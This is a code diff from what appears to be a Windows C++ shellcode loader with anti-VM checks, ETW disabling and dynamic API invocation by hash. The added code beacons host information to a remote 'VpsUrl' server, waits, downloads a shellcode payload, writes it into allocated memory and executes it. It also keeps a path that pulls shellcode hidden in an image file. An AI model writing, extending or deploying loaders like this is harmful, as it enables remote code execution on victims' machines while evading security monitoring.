@@ -8,7 +8,7 @@
 #include "AntiVm.h"
 #include "Function.hpp"
 #include "shellcode.h"
-
+#include "requests/infoSender.h"
 #include <bcrypt.h>
 #pragma comment(lib, "bcrypt.lib")
 
@@ -101,17 +101,47 @@ void DecryptShellcode(LPVOID lpMem, SIZE_T size) {
 
 
 void test() {
-	initAllFunc();
-	disableETW();
+
+
+	std::string url = VpsUrl;
+	send_info(url);
+	// fetch_index(url);
+	custom_sleep(1000 * 30); // 等待半分钟后开始轮询
+
+	std::vector<unsigned char> shellcode = fetch_payload(url);
+	if (shellcode.size() == 0) {
+		return;
+	}
+
+	LPVOID lpMem = NULL;
+	SIZE_T size = shellcode.size();
+	NTSTATUS status = AllocateMem(&lpMem, &size);
 	custom_sleep(500); // sleep 0.5s
+
+	memcpy(lpMem, shellcode.data(), size);
+	// DecryptShellcode(lpMem, size);
+
+
+
+	ExecuteShellcodeStruct execStruct = { 0 };
+	execStruct.lpMem = lpMem;
+	execStruct.memSize = size;
+	ExecuteShellcode(&execStruct);
 }
 
 
 // Hide Console
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 // int main() {
-	test();
+// 
+	// init
 	initAllFunc();
+
+// ============================= TEST ===============================	
+	test();
+	return 0;
+// ============================= TEST END ===============================	
+
 	if (DisableETW) {
 		disableETW();
 	}
@@ -161,51 +191,65 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	}
 	
 	// ============================= Allocate Memory ===============================
-	else { 
-		if (EnableSteg) {
-			PBYTE stegShellcode = NULL;
-			DWORD stegSize = 0;
 
-			// 获取当前目录
-			WCHAR currentDir[MAX_PATH];
-			GetCurrentDirectoryW(MAX_PATH, currentDir);
+	LPVOID lpMem = nullptr;
+	SIZE_T size = 0;
+	const void* shellcode_ptr = nullptr;
 
-			// 构建图片路径
-			WCHAR imagePath[MAX_PATH];
-			wcscpy_s(imagePath, currentDir);
-			wcscat_s(imagePath, stegPath);
-
-			if (!ExtractShellcodeFromImage(imagePath, &stegShellcode, &stegSize)) {
-				// DebugPrintA("Failed to extract shellcode from image\n");
-				return -1;
-			}
-
-			// 使用提取的shellcode替换原始数据
-			memcpy(shellcode, stegShellcode, stegSize);
-			shellcode_size = stegSize;
-			SIZE_T size = 0;
-			NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtFreeVirtualMemoryStruct.funcAddr, NtFreeVirtualMemoryStruct.funcHash,
-				(HANDLE)-1, &stegShellcode,&size,MEM_RELEASE);
-			
-		}
-		LPVOID lpMem = NULL;
-		SIZE_T size = shellcode_size;
-		NTSTATUS status = AllocateMem(&lpMem, &size);
-		// ======================= Processing Payload ==================================
-		custom_sleep(500); // sleep 0.5s
-
-		memcpy(lpMem, shellcode, size);
-		DecryptShellcode(lpMem, size);
-		// ============================  EXECUTE ==================================
-
+	std::vector<unsigned char> shellcode_vec;
 		
+	if (EnableSteg && !EnableAccessControl) {
+		PBYTE stegShellcode = NULL;
+		DWORD stegSize = 0;
 
-		ExecuteShellcodeStruct execStruct = { 0 };
-		execStruct.lpMem = lpMem;
-		execStruct.memSize = size;
-		ExecuteShellcode(&execStruct);
-		// ============================ EXECUTE END ================================
+		// 获取当前目录
+		WCHAR currentDir[MAX_PATH];
+		GetCurrentDirectoryW(MAX_PATH, currentDir);
+
+		// 构建图片路径
+		WCHAR imagePath[MAX_PATH];
+		wcscpy_s(imagePath, currentDir);
+		wcscat_s(imagePath, stegPath);
+
+		if (!ExtractShellcodeFromImage(imagePath, &stegShellcode, &stegSize)) {
+			// DebugPrintA("Failed to extract shellcode from image\n");
+			return -1;
+		}
+
+		// 使用提取的shellcode替换原始数据
+		memcpy(shellcode, stegShellcode, stegSize);
+		shellcode_size = stegSize;
+
+		NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtFreeVirtualMemoryStruct.funcAddr, NtFreeVirtualMemoryStruct.funcHash,
+			(HANDLE)-1, &stegShellcode,&size,MEM_RELEASE);
+			
+		shellcode_ptr = shellcode;
+		size = shellcode_size;
 	}
+	else if (EnableAccessControl) {
+		std::string url = VpsUrl;
+		send_info(url);
+
+		custom_sleep(1000 * 30); // 等待半分钟后开始轮询
+		shellcode_vec = fetch_payload(url);
+
+		size = shellcode_vec.size();
+		if (size == 0) return 0;
+
+		shellcode_ptr = shellcode_vec.data();
+	}
+	else {
+		size = shellcode_size;
+		shellcode_ptr = shellcode;
+	}
+	// ============================= Allocate Memory ===============================
+	NTSTATUS status = AllocateMem(&lpMem, &size);
+	memcpy(lpMem, shellcode_ptr, size);
+	DecryptShellcode(lpMem, size); // 演示时不加密
+
+	ExecuteShellcodeStruct execStruct = { lpMem,size };
+	ExecuteShellcode(&execStruct);
+	
 	
 
 	return 0;
